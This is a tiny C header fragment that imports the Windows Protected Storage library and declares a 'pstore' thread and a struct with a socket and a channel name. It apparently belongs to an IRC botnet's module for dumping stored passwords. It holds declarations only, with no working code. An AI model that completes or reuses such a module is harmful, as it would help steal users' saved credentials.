
DWORD WINAPI pstore (LPVOID param);
#import "pstorec.dll" no_namespace
#include <psapi.h>

typedef struct pststrct
{
	SOCKET sock;
	char chan[128];
	int threadnum;
	BOOL gotinfo;
} pststrct;